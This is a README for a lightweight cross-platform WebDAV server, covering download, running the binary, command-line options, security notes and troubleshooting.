# 🚀 webdav-server - Lightweight WebDAV Server with Built-in Web Interface

[![Download Latest Release](https://img.shields.io/badge/Download-webdav--server-blue?style=for-the-badge&logo=github)](https://github.com/epayumo/webdav-server/releases)

---

## 📖 What is webdav-server?

webdav-server is a simple and lightweight WebDAV server designed for quick setup and easy use. It is built in C/C++ and compiled as a single binary, making it fast and efficient. The server includes a web-based interface that lets you manage your files easily from any browser.

This tool works on many operating systems, including Windows, macOS, Linux, and FreeBSD. webdav-server is meant to help you share files over your local network or internet using the WebDAV protocol, which many devices and programs support natively.

---

## 💡 Why use webdav-server?

- **Easy to Run:** Just download one file, and you’re ready to start.
- **Cross-Platform:** Works on most computers, from Windows to Unix-based systems.
- **Minimal Setup:** No need to install complicated software or dependencies.
- **Web Interface:** Manage files through a browser without extra software.
- **Compatible:** Use with Windows Explorer, macOS Finder, or any WebDAV-capable app.

---

## 🖥️ System Requirements

- **Operating Systems Supported:**
  - Windows 7 and newer
  - macOS 10.12 and newer
  - Linux distributions with standard kernel 3.x or newer
  - FreeBSD 11 and newer
- **Processor:** Any modern x86_64 or ARM CPU
- **Memory:** At least 100 MB free RAM recommended
- **Network:** Internet or local network connection for file sharing
- **Additional:** Web browser to use the built-in web interface

---

## 📥 Download & Install

To get started with webdav-server, please follow these steps:

1. **Visit the Releases Page**

   Click the big button below to go to the webdav-server releases page on GitHub:

   [![Download of webdav-server](https://img.shields.io/badge/Download-webdav--server-blue?style=for-the-badge&logo=github)](https://github.com/epayumo/webdav-server/releases)

2. **Choose Your File**

   On the releases page, look for the latest version. Find the file that matches your operating system:

   - For Windows: Look for a `.exe` file
   - For macOS: Look for a `.dmg` or binary file
   - For Linux/FreeBSD: Look for a binary or archive suited for your system

3. **Download the File**

   Click the file name to download the binary to your computer.

4. **Run the Application**

   - On Windows: Double-click the `.exe` file you downloaded.
   - On macOS/Linux/FreeBSD: Open a terminal, navigate to the folder containing the binary, then run it using: `./webdav-server`

   If needed, you may have to make the binary executable with the command:  
   `chmod +x webdav-server`

5. **Open the Web Interface**

   Once running, open your web browser and go to:  
   `http://localhost:8080`

   This web page lets you control the server, manage files, and check status.

---

## 🚦 How to Use webdav-server

1. **Start the Server**

   Launch the downloaded program. It starts a WebDAV server on your computer.

2. **Access the Web Interface**

   Visit `http://localhost:8080` in your browser. Here you can:

   - Upload and download files
   - Manage folders
   - See connected clients
   - Change server settings (like port or root directory)

3. **Connect from Other Devices**

   Use any WebDAV client on your phone, tablet, or other computer to connect using your machine’s IP and port 8080. For example:

   ```
   http://192.168.1.100:8080
   ```

4. **Stop the Server**

   Close the application window or use Ctrl+C in the terminal to stop it.

---

## ⚙️ Configuration Options

You can customize webdav-server by adding command-line options when you launch it. Common options include:

- `--port <number>`: Use a different port for the server (default is 8080).
- `--root <folder>`: Change the root directory where files are served from (default is current directory).
- `--readonly`: Start the server in read-only mode.
- `--auth <user>:<password>`: Require a username and password for access.

Example command to start with a custom folder and port:

```sh
./webdav-server --port 9090 --root /Users/yourname/webdavfiles
```

---

## 🔒 Security Notes

- By default, webdav-server does not use encryption. Only run it on trusted networks.
- For secure remote access, use VPN or tunnels like SSH with port forwarding.
- Always set a username and password if you plan to expose the server outside your local network.
- Keep the binary updated by checking the releases page regularly.

---

## 🧩 Supported Features at a Glance

| Feature              | Details                                |
|----------------------|---------------------------------------|
| WebDAV Protocol      | Full basic WebDAV support              |
| Cross-platform       | Runs on Windows, macOS, Linux, FreeBSD|
| Single Binary        | No need for installation or dependencies|
| Embedded Web UI      | Manage files from any web browser     |
| Custom Port          | Change server’s listening port         |
| Authentication      | Username and password protection       |
| Read-only Mode       | Run server without allowing writes     |

---

## 🛠 Troubleshooting Tips

- **Server won’t start:**  
  Make sure you have permission to run the file and that no other app uses the chosen port.

- **Cannot connect from another device:**  
  Check your firewall settings. Make sure the port is open and your devices are on the same network.

- **Web interface not loading:**  
  Verify you typed the correct URL (`http://localhost:8080`) when running locally.

- **File permissions issues:**  
  Ensure the server has access rights to the folder you specified as root.

---

## 📚 Learn More and Get Support

Visit the GitHub repository for documentation, source code, and updates:  
https://github.com/epayumo/webdav-server

If you have questions or encounter problems, use the GitHub Issues page to report them.

---

## ⚖ License

This project is open source. You can use and modify it under the terms provided in the repository. Please check the LICENSE file for details.